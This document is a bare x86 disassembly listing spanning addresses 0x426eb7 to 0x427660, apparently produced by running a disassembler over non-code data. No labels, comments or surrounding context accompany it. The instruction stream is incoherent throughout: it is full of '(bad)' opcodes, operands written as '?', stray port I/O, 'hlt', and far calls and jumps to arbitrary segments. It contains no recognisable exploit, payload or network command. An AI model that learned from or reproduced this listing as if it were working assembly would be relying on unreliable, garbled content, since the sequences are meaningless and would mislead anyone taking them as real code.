  426eb7:	ins    BYTE PTR es:[edi],dx
  426eb8:	jmp    0xcdb6:0xfe589540
  426ebf:	or     al,bl
  426ec1:	or     eax,edi
  426ec3:	xchg   BYTE PTR [edx+0x7f68d679],al
  426ec9:	retf   0xe738
  426ecc:	out    dx,eax
  426ecd:	dec    eax
  426ece:	pushf  
  426ecf:	cs in  eax,dx
  426ed1:	test   DWORD PTR [edi+0x6f53c43e],esi
  426ed7:	repz or al,0x72
  426eda:	jne    0x426f18
  426edc:	jns    0x426f30
  426ede:	inc    eax
  426edf:	fdiv   DWORD PTR [edi-0x7cac85ae]
  426ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ee6:	imul   BYTE PTR [esi]
  426ee8:	push   ebx
  426ee9:	or     edi,DWORD PTR [edx+0x7a2b34be]
  426eef:	adc    eax,0xefcd9d0b
  426ef4:	jnp    0x426e96
  426ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ef7:	pop    ebp
  426ef8:	xor    BYTE PTR [ebp-0x30b68b9b],dh
  426efe:	mov    ah,0x3f
  426f00:	and    cl,dl
  426f02:	and    dh,BYTE PTR [edx-0x4b]
  426f05:	add    DWORD PTR [ebp-0x69774eae],edi
  426f0b:	add    DWORD PTR [ebp-0x1e],edi
  426f0e:	jns    0x426e91
  426f10:	call   0x112eca40
  426f15:	xchg   edi,eax
  426f16:	data16 mov al,ah
  426f19:	in     eax,dx
  426f1a:	jle    0x426efd
  426f1c:	jg     0x426ee5
  426f1e:	add    edi,esi
  426f20:	lahf   
  426f21:	adc    ebx,esp
  426f23:	sbb    BYTE PTR [ebx-0x10f64990],ch
  426f29:	mov    bl,0x91
  426f2b:	push   cs
  426f2c:	lea    edi,[ecx+0x7a6d866f]
  426f32:	mov    edi,0x9e96b021
  426f37:	push   ecx
  426f38:	das    
  426f39:	imul   ecx,DWORD PTR [eax-0x2039c3f6],0xffffffef
  426f40:	loop   0x426f75
  426f42:	ja     0x426f98
  426f44:	or     ecx,DWORD PTR [ecx-0x8]
  426f47:	hlt    
  426f48:	xor    edi,DWORD PTR [edi+0x19]
  426f4b:	jae    0x426ef4
  426f4d:	sub    DWORD PTR [edx-0x5c],eax
  426f50:	lds    ebp,FWORD PTR [ebx-0x7]
  426f53:	or     eax,DWORD PTR [edi+0x71b179f3]
  426f59:	jne    0x426f01
  426f5b:	fcom   DWORD PTR [edx+0x7568c8a4]
  426f61:	int    0x7e
  426f63:	lahf   
  426f64:	inc    edx
  426f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f66:	xor    DWORD PTR [esi-0x4e676259],edx
  426f6c:	sbb    BYTE PTR [edx],al
  426f6e:	adc    al,0x94
  426f70:	mov    bh,0x8a
  426f72:	sub    al,dh
  426f74:	cmp    bl,BYTE PTR [esi+0x71c585c9]
  426f7a:	sub    edi,ecx
  426f7c:	add    DWORD PTR [edx-0x42],eax
  426f7f:	stc    
  426f80:	repz mov al,0xbf
  426f83:	mov    ?,WORD PTR [ebx-0x27]
  426f86:	cmp    BYTE PTR [esi],0xbd
  426f89:	(bad)  
  426f8a:	cmp    al,BYTE PTR [edx+0x75]
  426f8d:	mov    edi,0xda340f71
  426f92:	(bad)  
  426f93:	xor    dh,BYTE PTR [esi-0x23]
  426f96:	pop    es
  426f97:	imul   edi,DWORD PTR [edx],0x4f142454
  426f9d:	lock jns 0x426fdf
  426fa0:	xor    eax,0x57fbaf76
  426fa5:	mov    dl,0x8a
  426fa7:	sub    edi,DWORD PTR [eax-0x75]
  426faa:	jecxz  0x426fb0
  426fac:	jnp    0x426f2f
  426fae:	sbb    DWORD PTR [eiz*2+0x3e0df733],edx
  426fb5:	xor    eax,0x37beac43
  426fba:	and    al,0x6a
  426fbc:	bnd call 0xe9eba781
  426fc2:	stos   DWORD PTR es:[edi],eax
  426fc3:	jns    0x426fe9
  426fc5:	push   ss
  426fc6:	popf   
  426fc7:	or     bl,BYTE PTR [ecx]
  426fc9:	inc    edi
  426fca:	mov    al,ds:0xb4f00783
  426fcf:	out    0x31,al
  426fd1:	aam    0xf0
  426fd3:	jge    0x427024
  426fd5:	xor    DWORD PTR [esi-0x7],edi
  426fd8:	push   ebx
  426fd9:	cmp    cl,BYTE PTR [ecx+eax*1]
  426fdc:	jnp    0x426f8f
  426fde:	out    0xd1,al
  426fe0:	pop    ds
  426fe1:	or     edi,DWORD PTR [ecx+0x7e]
  426fe4:	not    BYTE PTR [eax+ebx*8]
  426fe7:	push   0xc
  426fe9:	ja     0x427014
  426feb:	inc    edx
  426fec:	mov    al,cl
  426fee:	or     cl,BYTE PTR [edx]
  426ff0:	or     al,0xdc
  426ff2:	mov    dh,0xf2
  426ff4:	aad    0x7a
  426ff6:	imul   ebp,DWORD PTR [edx+0x52],0x32d2b22c
  426ffd:	add    BYTE PTR ds:0x6fbce23e,dl
  427003:	mov    ds:0xef67b1f1,al
  427008:	es ds jae 0x426fec
  42700c:	or     DWORD PTR ds:0xb42e2083,esp
  427012:	dec    esp
  427013:	sbb    DWORD PTR [eax],0xb
  427016:	in     eax,dx
	...
  42701f:	add    BYTE PTR [eax],al
  427021:	sbb    eax,DWORD PTR [ebp+0x65]
  427024:	ret    
  427025:	jg     0x42700a
  427027:	mov    edi,0x3db787dd
  42702c:	rcr    BYTE PTR [edi],cl
  42702e:	jl     0x229374a
  427034:	add    BYTE PTR [esi+0x4b000003],ch
  42703a:	dec    eax
  42703b:	je     0x42704e
  42703d:	jmp    0x3010de50
  427042:	fwait
  427043:	in     al,0x60
  427045:	add    ebx,DWORD PTR [esi-0x217a1b2e]
  42704b:	iret   
  42704c:	fst    QWORD PTR [ebp+0x79]
  42704f:	neg    BYTE PTR [esi+ebp*4-0x73]
  427053:	leave  
  427054:	dec    eax
  427055:	xchg   edi,eax
  427056:	dec    edx
  427057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427058:	clc    
  427059:	cwde   
  42705a:	xchg   ecx,eax
  42705b:	or     ebx,DWORD PTR [eax-0x4e04a5e7]
  427061:	lock inc edi
  427063:	mov    al,ds:0x528e6a7e
  427068:	jno    0x42703d
  42706a:	sbb    al,0x93
  42706c:	stos   BYTE PTR es:[edi],al
  42706d:	inc    edx
  42706e:	push   ebx
  42706f:	pop    eax
  427070:	inc    esi
  427071:	popf   
  427072:	rcr    BYTE PTR [esi-0xe],0x28
  427076:	stos   DWORD PTR es:[edi],eax
  427077:	mov    ch,0xfe
  427079:	lea    edx,[edi+0x4c]
  42707c:	inc    eax
  42707d:	dec    eax
  42707e:	push   0x40d23dac
  427083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427085:	sbb    al,0x75
  427087:	rol    al,0xfc
  42708a:	nop
  42708b:	cwde   
  42708c:	jmp    0x47e5243
  427091:	dec    ecx
  427092:	fnstcw WORD PTR [ecx+edx*4+0x7d]
  427096:	jmp    0xee66ea9c
  42709b:	rcl    ah,0x36
  42709e:	jmp    0x427058
  4270a0:	xor    eax,0xa60a85c5
  4270a5:	int    0x6c
  4270a7:	push   ds
  4270a8:	popf   
  4270a9:	pop    edx
  4270aa:	sbb    BYTE PTR [edx],dh
  4270ac:	dec    ebx
  4270ad:	push   0x17e552d8
  4270b2:	mov    esp,fs
  4270b4:	xchg   esi,eax
  4270b5:	imul   edx,DWORD PTR [eax-0x73],0x54b03477
  4270bc:	or     BYTE PTR [ebx],ch
  4270be:	cmp    al,0xde
  4270c0:	fadd   st,st(7)
  4270c2:	nop
  4270c3:	imul   ebx,DWORD PTR [ecx*4+0x16e4f6d8],0x5e63db4a
  4270ce:	cs cmp al,0xdd
  4270d1:	jb     0x427148
  4270d3:	in     eax,dx
  4270d4:	loop   0x427140
  4270d6:	sbb    al,0xe3
  4270d8:	mov    esp,0x90279486
  4270dd:	mov    dl,0xd3
  4270df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270e0:	shl    BYTE PTR [ecx+0x418962da],cl
  4270e6:	mov    ch,0xe8
  4270e8:	or     bh,BYTE PTR [ebp+0x6164f7d]
  4270ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270ef:	sub    ch,BYTE PTR ds:0x9928416f
  4270f5:	lds    ecx,FWORD PTR [ebx]
  4270f7:	cmp    al,0x60
  4270f9:	jle    0x42716e
  4270fb:	push   eax
  4270fc:	stc    
  4270fd:	inc    esp
  4270fe:	clc    
  4270ff:	sbb    ch,bh
  427101:	iret   
  427102:	ins    BYTE PTR es:[edi],dx
  427103:	dec    esp
  427104:	enter  0x8cb6,0xbf
  427108:	ins    BYTE PTR es:[edi],dx
  427109:	jae    0x427175
  42710b:	lds    ebx,FWORD PTR [eax]
  42710d:	mov    ds:0x77add1fb,al
  427112:	push   0xffffffa4
  427114:	(bad)  [esi+0x69]
  427117:	cmp    BYTE PTR [edx-0x15],bh
  42711a:	inc    ebp
  42711b:	add    BYTE PTR [ebp+0x1ac68949],0xef
  427122:	iret   
  427123:	out    0x59,eax
  427125:	bound  ebp,QWORD PTR [ecx]
  427127:	pop    ebp
  427128:	enter  0x1d7f,0x62
  42712c:	cld    
  42712d:	data16 add bh,bl
  427130:	push   cs
  427131:	fisttp QWORD PTR [edx+ecx*1+0x6f]
  427135:	xchg   DWORD PTR [edx+ebp*1-0x5c2a85d],eax
  42713c:	(bad)  
  42713d:	sub    dl,dh
  42713f:	xor    BYTE PTR [eax+0x58c0d3e3],0x69
  427146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427147:	adc    BYTE PTR [edi-0x6],0x6a
  42714b:	fdiv   QWORD PTR [edx-0x18]
  42714e:	mov    eax,0x3b58e6a9
  427153:	outs   dx,DWORD PTR ds:[esi]
  427154:	inc    edi
  427155:	int    0x6a
  427157:	rcr    eax,0x56
  42715a:	sar    DWORD PTR [esi+0x50881165],1
  427160:	xor    edx,DWORD PTR [ecx-0x95cbbed]
  427166:	daa    
  427167:	ja     0x4271b4
  427169:	xchg   edx,eax
  42716a:	pop    es
  42716b:	fisubr DWORD PTR [esi-0x15dcfd63]
  427171:	ja     0x4271e6
  427173:	xor    eax,0xaa0fdd75
  427178:	pop    edx
  427179:	lods   eax,DWORD PTR ds:[esi]
  42717a:	mov    esp,0x3d839423
  42717f:	and    al,0xbf
  427181:	ja     0x427176
  427183:	push   ss
  427184:	pop    ds
  427185:	mov    eax,0xfd0bdfb8
  42718a:	push   ss
  42718b:	and    eax,eax
  42718d:	adc    DWORD PTR [esi+esi*1+0x3f],ebx
  427191:	test   al,0x20
  427193:	ret    0x8277
  427196:	clc    
  427197:	jmp    0x42711c
  427199:	repnz hlt 
  42719b:	adc    al,0x92
  42719d:	sbb    BYTE PTR [eax],0xe8
  4271a0:	or     esp,DWORD PTR [eax+0x4a]
  4271a3:	hlt    
  4271a4:	scas   al,BYTE PTR es:[edi]
  4271a5:	loopne 0x4271a0
  4271a7:	lahf   
  4271a8:	cs push 0x944c5b1f
  4271ae:	push   0xffffffb7
  4271b0:	jecxz  0x4271ad
  4271b2:	test   al,0x6b
  4271b4:	icebp  
  4271b5:	enter  0x867c,0x4a
  4271b9:	nop
  4271ba:	fbld   TBYTE PTR [esi]
  4271bc:	add    DWORD PTR [ecx-0x207deb68],ebx
  4271c2:	mov    al,ds:0xde7b4e85
  4271c7:	loop   0x427173
  4271c9:	mov    ecx,0x4ff1dd42
  4271ce:	or     DWORD PTR [edi+0x53],0xffffff81
  4271d2:	mov    eax,0x88e62da4
  4271d7:	xchg   ebx,esp
  4271d9:	stos   BYTE PTR es:[edi],al
  4271da:	cmp    BYTE PTR ds:0x4b8bc761,bl
  4271e0:	jecxz  0x4271e3
  4271e2:	lds    ebp,FWORD PTR [esi-0x6544d6b1]
  4271e8:	repz sub ah,0xd9
  4271ec:	sbb    edi,eax
  4271ee:	mov    ds:0xaec5bc55,eax
  4271f3:	cs dec eax
  4271f5:	fwait
  4271f6:	add    BYTE PTR [esp+ecx*8-0x72],bl
  4271fa:	push   ds
  4271fb:	ss push cs
  4271fd:	xchg   ecx,eax
  4271fe:	dec    esp
  4271ff:	cmp    eax,0xf403195a
  427204:	jns    0x4271dd
  427206:	scas   al,BYTE PTR es:[edi]
  427207:	jo     0x4271f9
  427209:	pop    ebx
  42720a:	repz mov dl,0x45
  42720d:	es sub eax,0xee43c02
  427213:	xchg   edi,eax
  427214:	(bad)  
  427215:	sub    DWORD PTR [eax+eiz*4+0x4e28c470],edx
  42721c:	popa   
  42721d:	sub    edi,DWORD PTR [eax-0x7a]
  427220:	sbb    BYTE PTR [edx+0x5],bl
  427223:	jnp    0x427291
  427225:	sbb    edx,DWORD PTR [ebp-0x43]
  427228:	inc    ebx
  427229:	xchg   BYTE PTR [eax-0xb2af386],bh
  42722f:	cmp    al,0x3b
  427231:	(bad)  
  427232:	pop    es
  427233:	fdecstp 
  427235:	out    dx,al
  427236:	sbb    bh,ch
  427238:	out    dx,al
  427239:	push   ecx
  42723a:	adc    ch,BYTE PTR [ecx]
  42723c:	fstp   DWORD PTR [ebp-0x21]
  42723f:	lds    edx,FWORD PTR [edx-0x5d8249ac]
  427245:	rol    BYTE PTR [edx+0x4f],0x9b
  427249:	and    eax,DWORD PTR [eax+0x31]
  42724c:	rcr    DWORD PTR [eax],1
  42724e:	fdivr  st(5),st
  427250:	push   ds
  427251:	mov    BYTE PTR [eax-0x4b1800de],bl
  427257:	fist   WORD PTR [ecx+0x18]
  42725a:	ja     0x42724a
  42725c:	inc    ebp
  42725d:	je     0x42720c
  42725f:	not    BYTE PTR [ebx+0x66]
  427262:	xor    al,0xe8
  427264:	dec    edi
  427265:	test   dl,ch
  427267:	or     al,0x6f
  427269:	bnd call 0x485e8a9b
  42726f:	ret    
  427270:	xchg   esp,eax
  427271:	hlt    
  427272:	lds    esp,FWORD PTR [ebx+0x708bb090]
  427278:	in     eax,dx
  427279:	rol    ebp,cl
  42727b:	fstp   TBYTE PTR [esi]
  42727d:	sti    
  42727e:	lods   eax,DWORD PTR ds:[esi]
  42727f:	dec    edx
  427280:	xlat   BYTE PTR ds:[ebx]
  427281:	or     cl,dl
  427283:	mov    bl,0x7a
  427286:	and    edx,esp
  427288:	mov    ch,0x72
  42728a:	sar    DWORD PTR [edi-0x2f],1
  42728d:	test   eax,0x10cf8aa2
  427292:	leave  
  427293:	jg     0x427227
  427295:	(bad)  
  427296:	cdq    
  427297:	mov    edi,0x1ac0953d
  42729c:	cmp    ebx,DWORD PTR ds:0x51cdebca
  4272a2:	es pop ecx
  4272a4:	leave  
  4272a5:	es (bad) 
  4272a7:	cmp    ah,BYTE PTR [ecx+0x4]
  4272aa:	dec    esp
  4272ab:	into   
  4272ac:	cmp    bh,BYTE PTR [eax+0x52]
  4272af:	sub    al,0xad
  4272b1:	ins    BYTE PTR es:[edi],dx
  4272b2:	mov    ebp,0x29a99510
  4272b7:	sti    
  4272b8:	outs   dx,BYTE PTR ds:[esi]
  4272b9:	neg    edx
  4272bb:	mov    esi,?
  4272bd:	push   es
  4272be:	push   0x3fc6cf3a
  4272c3:	adc    ch,0x56
  4272c6:	pop    ss
  4272c7:	in     eax,dx
  4272c8:	pushf  
  4272c9:	jno    0x42729c
  4272cb:	sbb    DWORD PTR [ebx+edi*2],esp
  4272ce:	xor    ah,cl
  4272d0:	pop    es
  4272d1:	push   esp
  4272d2:	or     bh,BYTE PTR [eax]
  4272d4:	mov    bl,0xd2
  4272d6:	in     al,0xb9
  4272d8:	sti    
  4272d9:	inc    esi
  4272da:	stos   BYTE PTR es:[edi],al
  4272db:	inc    edi
  4272dc:	jle    0x427333
  4272de:	scas   eax,DWORD PTR es:[edi]
  4272df:	or     edi,DWORD PTR [esi]
  4272e1:	mov    al,0x94
  4272e3:	cli    
  4272e4:	or     al,0xb3
  4272e6:	in     eax,0xde
  4272e8:	mov    dh,0x1d
  4272ea:	adc    DWORD PTR [eax+0x5e],edi
  4272ed:	mov    ds:0x110c3b02,al
  4272f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272f3:	fdivr  st,st(4)
  4272f5:	pop    esp
  4272f6:	test   al,0x4
  4272f8:	inc    edx
  4272f9:	lods   al,BYTE PTR ds:[esi]
  4272fa:	lds    edi,FWORD PTR [ebx+0x12a44a99]
  427300:	cld    
  427301:	mov    esp,0x17f1827b
  427306:	pop    esp
  427307:	loop   0x42737f
  427309:	dec    esp
  42730a:	ror    DWORD PTR [eax+0x4b],1
  42730d:	mov    esp,0xe6fa6389
  427312:	push   ds
  427313:	jge    0x427296
  427315:	test   DWORD PTR [eax],esi
  427317:	test   al,0x74
  427319:	inc    ebx
  42731a:	ret    
  42731b:	addr16 clc 
  42731d:	dec    edx
  42731e:	mov    dh,BYTE PTR [eax]
  427320:	(bad)  
  427321:	hlt    
  427322:	sbb    al,0xe9
  427324:	and    ebx,DWORD PTR [eax+eax*1+0x72]
  427328:	out    0xc1,al
  42732a:	(bad)  
  42732c:	push   cs
  42732d:	aad    0x70
  42732f:	sbb    ebx,DWORD PTR ds:[edi]
  427332:	scas   al,BYTE PTR es:[edi]
  427333:	cmp    DWORD PTR [edx],ecx
  427335:	inc    ecx
  427336:	pop    esp
  427337:	sub    DWORD PTR cs:[ecx],edx
  42733a:	cld    
  42733b:	lods   al,BYTE PTR ds:[esi]
  42733c:	fisub  DWORD PTR [ebx*8+0x6d284f36]
  427343:	sbb    BYTE PTR [ecx-0xf],ah
  427346:	stos   BYTE PTR es:[edi],al
  427347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427348:	dec    eax
  427349:	or     esp,edi
  42734b:	mov    cl,bl
  42734d:	sbb    edx,DWORD PTR [ebx]
  42734f:	scas   eax,DWORD PTR es:[edi]
  427350:	dec    ebx
  427351:	or     eax,0x4ba3067a
  427356:	xor    ah,BYTE PTR [edx-0x9]
  427359:	aas    
  42735a:	inc    ecx
  42735b:	push   edx
  42735c:	ret    
  42735d:	xor    al,0x56
  42735f:	cmp    bh,cl
  427361:	adc    bh,BYTE PTR [edx]
  427363:	jp     0x427360
  427365:	cmp    eax,0x49b36cfa
  42736a:	outs   dx,BYTE PTR ds:[esi]
  42736b:	iret   
  42736c:	mov    ecx,0x1c6625ec
  427372:	and    DWORD PTR [ecx],edi
  427374:	int    0xe1
  427376:	nop
  427377:	(bad)  
  427378:	scas   eax,DWORD PTR es:[edi]
  427379:	ins    DWORD PTR es:[edi],dx
  42737a:	push   cs
  42737b:	sbb    BYTE PTR [eax+0x5f],0x5f
  42737f:	pop    es
  427380:	mov    ecx,0xfcc8b7fc
  427385:	aam    0x0
  427387:	cli    
  427388:	or     al,0x46
  42738a:	jne    0x42736a
  42738c:	(bad)  
  42738e:	pop    ecx
  42738f:	xchg   BYTE PTR [eax+0x52],ch
  427392:	inc    ebp
  427393:	sub    BYTE PTR [ecx-0x20e368ab],0x31
  42739a:	out    dx,al
  42739b:	fidivr WORD PTR [edi]
  42739d:	daa    
  42739e:	dec    esi
  42739f:	sub    DWORD PTR [ecx],esi
  4273a1:	or     al,0x95
  4273a3:	repz aas 
  4273a5:	xchg   ebp,eax
  4273a6:	loopne 0x4273fc
  4273a8:	fcmovnb st,st(2)
  4273aa:	addr16 das 
  4273ac:	pop    eax
  4273ad:	rcl    BYTE PTR [edi+0x7],cl
  4273b0:	cmp    DWORD PTR ds:0x1f464980,ebx
  4273b6:	push   es
  4273b7:	mov    ebp,0x2dd974ed
  4273bc:	in     eax,dx
  4273bd:	stc    
  4273be:	xchg   esp,eax
  4273bf:	xlat   BYTE PTR ds:[ebx]
  4273c0:	mov    ebp,ebx
  4273c2:	xchg   esp,eax
  4273c3:	sti    
  4273c4:	adc    bl,BYTE PTR ds:0x144bbdf3
  4273ca:	jb     0x4273df
  4273cc:	inc    esi
  4273cd:	push   eax
  4273ce:	dec    ecx
  4273cf:	retf   0xbae5
  4273d2:	enter  0xc304,0x73
  4273d6:	mov    bl,0xb7
  4273d8:	js     0x4273e2
  4273da:	sub    dl,ch
  4273dc:	xchg   esi,eax
  4273dd:	(bad)  
  4273de:	mov    ah,0x97
  4273e0:	and    eax,0xd07abb93
  4273e5:	ins    BYTE PTR es:[edi],dx
  4273e6:	lods   al,BYTE PTR ds:[esi]
	...
  4273ef:	add    BYTE PTR [eax],al
  4273f1:	or     al,0x47
  4273f3:	inc    ebx
  4273f4:	xchg   esp,eax
  4273f5:	dec    ebx
  4273f6:	xchg   esp,eax
  4273f7:	(bad)  
  4273f9:	mov    eax,0x5e19f609
  4273fe:	(bad)  
  4273ff:	xchg   edx,eax
  427400:	ret    0xea75
  427403:	add    DWORD PTR [eax],eax
  427405:	scas   al,BYTE PTR es:[edi]
  427406:	add    eax,DWORD PTR [eax]
  427408:	add    ch,al
  42740a:	xor    BYTE PTR [ebx],bh
  42740c:	aad    0xce
  42740e:	fwait
  42740f:	ds pop ss
  427411:	add    esp,DWORD PTR ds:0xbe4ac2fd
  427417:	mov    ah,0x3e
  427419:	sub    ecx,edx
  42741b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42741c:	cmp    BYTE PTR [edi+ebx*2+0x27],0xb9
  427421:	call   0xa112:0x1456cfe
  427428:	mov    ebx,0xe7e7a601
  42742d:	add    esi,DWORD PTR [edx-0x60]
  427430:	mov    ss,ecx
  427432:	fimul  DWORD PTR [esi+edx*4]
  427435:	inc    edx
  427436:	xchg   BYTE PTR [edi],bh
  427438:	aam    0xad
  42743a:	push   ebx
  42743b:	jmp    0x427463
  42743d:	mov    esi,0x5f64ad5b
  427442:	jb     0x427498
  427444:	inc    ebp
  427445:	loope  0x4273e6
  427447:	push   ds
  427448:	add    eax,0x8dca3fbf
  42744d:	stos   DWORD PTR es:[edi],eax
  42744e:	(bad)  [eax+esi*1+0x271b5e67]
  427455:	fs inc esi
  427457:	stos   DWORD PTR es:[edi],eax
  427458:	repnz mov bh,0x52
  42745b:	sbb    edi,eax
  42745d:	test   eax,0xeec69ab6
  427462:	mov    esp,0x64450b40
  427467:	sbb    BYTE PTR [ebx],cl
  427469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42746a:	mov    WORD PTR [ebx-0x20],es
  42746d:	in     eax,0xda
  42746f:	dec    ecx
  427470:	mov    dl,al
  427472:	sub    bh,0x5d
  427475:	outs   dx,BYTE PTR ds:[esi]
  427476:	call   0x7459:0xf1b4133c
  42747d:	sub    eax,DWORD PTR [edx]
  42747f:	mov    ebp,0x415635f2
  427484:	inc    edi
  427485:	scas   al,BYTE PTR es:[edi]
  427486:	iret   
  427487:	addr16 jp 0x4274b5
  42748a:	xchg   esp,eax
  42748b:	jmp    0x4274d6
  42748d:	pop    ecx
  42748e:	fadd   DWORD PTR [edi]
  427490:	cmp    al,0x4c
  427492:	jecxz  0x4274f3
  427494:	dec    edi
  427495:	into   
  427496:	imul   edx,DWORD PTR [edi],0x32ad6e9f
  42749c:	ins    WORD PTR es:[edi],dx
  42749e:	ins    DWORD PTR es:[edi],dx
  42749f:	dec    edx
  4274a0:	pop    edx
  4274a1:	call   0xf8ae:0xd8f9a890
  4274a8:	inc    esi
  4274a9:	jne    0x4274e5
  4274ab:	iret   
  4274ac:	scas   eax,DWORD PTR es:[edi]
  4274ad:	push   0x7d7e4f35
  4274b2:	std    
  4274b3:	outs   dx,BYTE PTR ds:[esi]
  4274b4:	adc    DWORD PTR [edi+eax*8-0x707fa655],ebx
  4274bb:	sub    ecx,DWORD PTR [eax+ebp*1-0x1520b7bc]
  4274c2:	xchg   esi,eax
  4274c3:	ret    0x7033
  4274c6:	add    BYTE PTR [eax],cl
  4274c8:	sbb    cx,WORD PTR [edx]
  4274cb:	int3   
  4274cc:	popa   
  4274cd:	dec    edi
  4274ce:	sub    BYTE PTR [ebx+0x8],al
  4274d1:	push   eax
  4274d2:	or     edx,edx
  4274d4:	sub    ebx,0x2fc64189
  4274da:	ret    
  4274db:	and    edi,ecx
  4274dd:	mov    eax,ss
  4274df:	xchg   esi,eax
  4274e0:	stos   DWORD PTR es:[edi],eax
  4274e1:	aas    
  4274e2:	jg     0x4274a3
  4274e4:	in     al,dx
  4274e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274e6:	sub    bh,bh
  4274e8:	ss std 
  4274ea:	sbb    ebx,DWORD PTR [eax+0x53]
  4274ed:	or     eax,0x59e6ed52
  4274f2:	sahf   
  4274f3:	daa    
  4274f4:	inc    edi
  4274f5:	rcl    DWORD PTR [edi+0x331c13f5],0xe8
  4274fc:	cmp    esi,esp
  4274fe:	shr    DWORD PTR ds:0xeaa57852,0x25
  427505:	or     DWORD PTR [ebx+0x79c45ad1],ebx
  42750b:	cdq    
  42750c:	div    DWORD PTR [ebx-0x14960b18]
  427512:	retf   0x6236
  427515:	adc    al,0x6
  427517:	push   es
  427518:	lds    edx,FWORD PTR [ecx]
  42751a:	mov    bh,0x9e
  42751c:	mov    ecx,0x9191c328
  427521:	sahf   
  427522:	hlt    
  427523:	push   esi
  427524:	inc    ebp
  427525:	ror    BYTE PTR [edi],0x84
  427528:	mov    al,ds:0x64163961
  42752d:	sahf   
  42752e:	add    BYTE PTR [ecx+0x5f01a08b],0x24
  427535:	lods   al,BYTE PTR ds:[esi]
  427536:	(bad)  
  427537:	fild   WORD PTR [eax]
  427539:	add    BYTE PTR [eax],bl
  42753b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42753c:	push   edi
  42753d:	cmp    ecx,DWORD PTR [ebp+0x20c830ed]
  427543:	push   ds
  427544:	or     ecx,esp
  427546:	jo     0x427510
  427548:	in     al,dx
  427549:	push   esp
  42754a:	outs   dx,BYTE PTR ds:[esi]
  42754b:	sbb    DWORD PTR [esp+ebp*8+0x43],eax
  42754f:	fisttp WORD PTR [edi+0x7a8b63db]
  427555:	clc    
  427556:	and    BYTE PTR [ecx-0x1e],al
  427559:	data16 aam 0xd2
  42755c:	test   BYTE PTR [ecx],ch
  42755e:	(bad)  
  42755f:	loop   0x427528
  427561:	bound  esp,QWORD PTR ds:0x5daad396
  427567:	rol    BYTE PTR [esi-0x33],1
  42756a:	dec    ecx
  42756b:	ins    DWORD PTR es:[edi],dx
  42756c:	sbb    eax,0xacb9ccaa
  427571:	dec    ecx
  427572:	sbb    al,0x21
  427574:	sbb    al,0xbb
  427576:	fcom   DWORD PTR [esi]
  427578:	cmp    BYTE PTR [ebx+ecx*8+0x7f406193],al
  42757f:	cdq    
  427580:	mov    eax,ds:0xc39ea072
  427585:	cdq    
  427586:	pop    ecx
  427587:	fidivr DWORD PTR [edx+0x29]
  42758a:	clc    
  42758b:	aaa    
  42758c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42758d:	adc    al,BYTE PTR [esi+0x2cc5efc3]
  427593:	sahf   
  427594:	inc    ecx
  427595:	inc    DWORD PTR [edi-0x4b10db9e]
  42759b:	and    eax,0xd3596a18
  4275a0:	or     eax,0x10aa42ae
  4275a5:	retf   0x31d4
  4275a8:	cs xchg ebp,eax
  4275aa:	es push es
  4275ac:	fyl2xp1 
  4275ae:	ins    DWORD PTR es:[edi],dx
  4275af:	or     al,ch
  4275b1:	jae    0x4275b7
  4275b3:	jnp    0x42757f
  4275b5:	cdq    
  4275b6:	jae    0x427540
  4275b8:	mov    esi,0xbe815e52
  4275bd:	ja     0x42757f
  4275bf:	adc    eax,0x6e7e68c7
  4275c4:	loope  0x42763d
  4275c6:	and    al,0xb2
  4275c8:	loop   0x4275f9
  4275ca:	addr16 jne 0x42761b
  4275cd:	jg     0x427596
  4275cf:	cmp    eax,0xdce42e3a
  4275d4:	mov    ah,bl
  4275d6:	iret   
  4275d7:	push   ss
  4275d8:	(bad)  
  4275d9:	aas    
  4275da:	fstp   QWORD PTR [ebx+esi*1-0x5d8420d0]
  4275e1:	daa    
  4275e2:	or     dl,BYTE PTR [esi+ebp*8-0x2f047710]
  4275e9:	xchg   edx,eax
  4275ea:	mov    dl,BYTE PTR [edi+0x27]
  4275ed:	js     0x42760a
  4275ef:	out    dx,eax
  4275f0:	leave  
  4275f1:	mov    DWORD PTR [ecx+eax*8],ebx
  4275f4:	mov    ebp,0xba80240
  4275f9:	push   eax
  4275fa:	push   ebp
  4275fb:	mov    ds:0x70e4854a,eax
  427600:	nop
  427601:	sub    ebp,ebp
  427603:	jecxz  0x42763e
  427605:	xor    ch,0x9
  427608:	cmp    ch,BYTE PTR [esi+ebp*4]
  42760b:	jae    0x427625
  42760d:	mov    ch,0xa8
  42760f:	into   
  427610:	adc    DWORD PTR [edx],edx
  427612:	xor    al,0xd0
  427614:	jnp    0x427607
  427616:	into   
  427617:	xchg   DWORD PTR [esp+eax*4-0x6a],esp
  42761b:	(bad)  
  42761d:	xor    ebx,DWORD PTR [ebx+0x2b5b89ff]
  427623:	stc    
  427624:	or     al,0x4e
  427626:	imul   ecx,DWORD PTR [esi-0x1b],0x47d0b4e9
  42762d:	call   0xbdd9:0xbf91467c
  427634:	pop    edi
  427635:	xchg   dh,dh
  427637:	pusha  
  427638:	popf   
  427639:	jbe    0x4276a5
  42763b:	mov    WORD PTR [edx-0x5a6b96d8],?
  427641:	ja     0x42769e
  427643:	pop    eax
  427644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427645:	mov    ch,0x7
  427647:	call   0x3d559c43
  42764c:	pop    es
  42764d:	lods   al,BYTE PTR ds:[esi]
  42764e:	or     ebx,DWORD PTR [edx-0x15]
  427651:	xchg   edi,eax
  427652:	inc    BYTE PTR [eax]
  427654:	sbb    DWORD PTR [eax+edx*2-0x5e],esp
  427658:	js     0x427653
  42765a:	xchg   edi,eax
  42765b:	add    eax,0xd2563057
  427660:	dec    edi
